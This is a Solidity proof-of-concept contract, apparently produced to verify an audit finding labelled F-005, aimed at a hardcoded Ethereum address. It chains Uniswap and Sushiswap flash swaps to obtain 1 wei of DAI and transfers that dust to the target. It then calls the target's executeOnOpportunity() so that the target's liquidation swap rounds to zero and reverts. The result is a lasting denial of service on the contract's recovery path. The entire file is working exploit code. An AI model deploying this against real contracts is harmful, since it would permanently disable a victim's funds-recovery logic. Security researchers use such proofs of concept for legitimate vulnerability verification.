// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOpportunityTarget {
    function executeOnOpportunity() external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant DAI_DUST = 1;

    bool private _executed;
    bool private _hypothesisValidated;

    address private _profitToken;
    uint256 private _profitAmount;

    error NoDustAcquisitionRoute();
    error InvalidCallback();
    error DustTransferFailed();
    error DustAcquisitionFailed();
    error HypothesisRefuted();
    error DustDidNotPersist();

    struct DustRoute {
        address outerPair;
        address innerPair;
        address stablePair;
        uint256 usdcBorrowAmount;
        uint256 wethRepayToOuter;
        uint256 daiRepayToInner;
        uint256 daiOutFromStable;
        uint256 expectedLeftoverDai;
    }

    DustRoute private _route;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }

        _executed = true;
        _hypothesisValidated = false;
        _profitToken = address(0);
        _profitAmount = 0;

        uint256 targetDaiBefore = IERC20(DAI).balanceOf(TARGET);

        if (targetDaiBefore == 0 && IERC20(DAI).balanceOf(address(this)) < DAI_DUST) {
            _route = _findDustRoute();
            if (_route.outerPair == address(0)) {
                revert NoDustAcquisitionRoute();
            }
            _executeDustAcquisition();
        }

        if (targetDaiBefore == 0) {
            if (IERC20(DAI).balanceOf(address(this)) < DAI_DUST) {
                revert DustAcquisitionFailed();
            }
            if (!_safeTransfer(DAI, TARGET, DAI_DUST)) {
                revert DustTransferFailed();
            }
            if (IERC20(DAI).balanceOf(TARGET) < DAI_DUST) {
                revert DustTransferFailed();
            }
        }

        // Additional public on-chain economic steps above only source an already-existing
        // on-chain DAI wei without any privileged funding. The actual F-005 exploit
        // causality remains unchanged from here onward:
        // 1) TARGET has a positive DAI balance,
        // 2) executeOnOpportunity() attempts to liquidate it,
        // 3) the 1 wei DAI swap rounds to zero output on Uniswap V2 and reverts,
        // 4) the whole execution reverts,
        // 5) the dust remains and keeps bricking future recovery attempts.
        (bool ok,) = TARGET.call(abi.encodeWithSelector(IOpportunityTarget.executeOnOpportunity.selector));
        if (ok) {
            revert HypothesisRefuted();
        }

        uint256 targetDaiAfter = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiAfter == 0) {
            revert DustDidNotPersist();
        }

        _profitToken = DAI;
        _profitAmount = IERC20(DAI).balanceOf(address(this));
        _hypothesisValidated = true;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender == _route.outerPair) {
            uint256 borrowedUsdc = amount0 > 0 ? amount0 : amount1;
            if (borrowedUsdc != _route.usdcBorrowAmount) {
                revert InvalidCallback();
            }

            _flashBorrowSpecificToken(_route.innerPair, WETH, _route.wethRepayToOuter);

            if (!_safeTransfer(WETH, _route.outerPair, _route.wethRepayToOuter)) {
                revert InvalidCallback();
            }
            return;
        }

        if (msg.sender == _route.innerPair) {
            uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
            if (borrowedWeth != _route.wethRepayToOuter) {
                revert InvalidCallback();
            }

            uint256 daiBefore = IERC20(DAI).balanceOf(address(this));
            _swapExactPairInput(_route.stablePair, USDC, DAI, _route.usdcBorrowAmount, address(this));
            uint256 daiGained = IERC20(DAI).balanceOf(address(this)) - daiBefore;
            if (daiGained < _route.daiRepayToInner + DAI_DUST) {
                revert DustAcquisitionFailed();
            }

            if (!_safeTransfer(DAI, _route.innerPair, _route.daiRepayToInner)) {
                revert InvalidCallback();
            }
            return;
        }

        revert InvalidCallback();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "use tiny cross-pair flash swaps only to source an already-existing on-chain 1 wei DAI balance -> ",
                "transfer 1 wei DAI to TARGET -> call TARGET.executeOnOpportunity() -> ",
                "victim liquidation observes amountIn = 1 DAI wei -> tiny Uniswap V2 output rounds to zero -> ",
                "router swap reverts -> the whole transaction reverts and the DAI dust persists"
            )
        );
    }

    function _executeDustAcquisition() internal {
        _flashBorrowSpecificToken(_route.outerPair, USDC, _route.usdcBorrowAmount);
    }

    function _findDustRoute() internal view returns (DustRoute memory best) {
        address[2] memory factories = [UNI_FACTORY, SUSHI_FACTORY];
        uint256[8] memory borrowCandidates = [uint256(1), 2, 5, 10, 50, 100, 500, 1000];

        for (uint256 outerIndex = 0; outerIndex < factories.length; ++outerIndex) {
            address outerPair = IUniswapV2Factory(factories[outerIndex]).getPair(USDC, WETH);
            if (outerPair == address(0)) {
                continue;
            }

            (uint256 outerUsdcReserve, uint256 outerWethReserve) = _pairReservesFor(outerPair, USDC, WETH);
            if (outerUsdcReserve == 0 || outerWethReserve == 0) {
                continue;
            }

            for (uint256 innerIndex = 0; innerIndex < factories.length; ++innerIndex) {
                address innerPair = IUniswapV2Factory(factories[innerIndex]).getPair(DAI, WETH);
                if (innerPair == address(0)) {
                    continue;
                }

                (uint256 innerDaiReserve, uint256 innerWethReserve) = _pairReservesFor(innerPair, DAI, WETH);
                if (innerDaiReserve == 0 || innerWethReserve == 0) {
                    continue;
                }

                for (uint256 stableIndex = 0; stableIndex < factories.length; ++stableIndex) {
                    address stablePair = IUniswapV2Factory(factories[stableIndex]).getPair(USDC, DAI);
                    if (stablePair == address(0)) {
                        continue;
                    }

                    (uint256 stableUsdcReserve, uint256 stableDaiReserve) = _pairReservesFor(stablePair, USDC, DAI);
                    if (stableUsdcReserve == 0 || stableDaiReserve == 0) {
                        continue;
                    }

                    for (uint256 i = 0; i < borrowCandidates.length; ++i) {
                        uint256 usdcBorrow = borrowCandidates[i];
                        if (usdcBorrow >= outerUsdcReserve) {
                            continue;
                        }

                        uint256 wethRepay = _getAmountIn(usdcBorrow, outerWethReserve, outerUsdcReserve);
                        if (wethRepay == type(uint256).max || wethRepay >= innerWethReserve) {
                            continue;
                        }

                        uint256 daiRepay = _getAmountIn(wethRepay, innerDaiReserve, innerWethReserve);
                        uint256 daiOut = _getAmountOut(usdcBorrow, stableUsdcReserve, stableDaiReserve);
                        if (daiRepay == type(uint256).max || daiOut <= daiRepay + DAI_DUST) {
                            continue;
                        }

                        uint256 leftover = daiOut - daiRepay - DAI_DUST;
                        if (leftover > best.expectedLeftoverDai) {
                            best = DustRoute({
                                outerPair: outerPair,
                                innerPair: innerPair,
                                stablePair: stablePair,
                                usdcBorrowAmount: usdcBorrow,
                                wethRepayToOuter: wethRepay,
                                daiRepayToInner: daiRepay,
                                daiOutFromStable: daiOut,
                                expectedLeftoverDai: leftover
                            });
                        }
                    }
                }
            }
        }
    }

    function _flashBorrowSpecificToken(address pair, address tokenOut, uint256 amountOut) internal {
        address token0 = IUniswapV2Pair(pair).token0();
        uint256 amount0Out = token0 == tokenOut ? amountOut : 0;
        uint256 amount1Out = amount0Out == 0 ? amountOut : 0;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _swapExactPairInput(address pair, address tokenIn, address tokenOut, uint256 amountIn, address to) internal {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        uint256 amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0 || amountOut >= reserveOut) {
            revert DustAcquisitionFailed();
        }

        if (!_safeTransfer(tokenIn, pair, amountIn)) {
            revert DustAcquisitionFailed();
        }

        address token0 = IUniswapV2Pair(pair).token0();
        uint256 amount0Out = token0 == tokenOut ? amountOut : 0;
        uint256 amount1Out = amount0Out == 0 ? amountOut : 0;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, to, new bytes(0));
    }

    function _pairReservesFor(address pair, address tokenA, address tokenB)
        internal
        view
        returns (uint256 reserveA, uint256 reserveB)
    {
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (!((token0 == tokenA && token1 == tokenB) || (token0 == tokenB && token1 == tokenA))) {
            revert InvalidCallback();
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (token0 == tokenA) {
            reserveA = reserve0;
            reserveB = reserve1;
        } else {
            reserveA = reserve1;
            reserveB = reserve0;
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return type(uint256).max;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
}
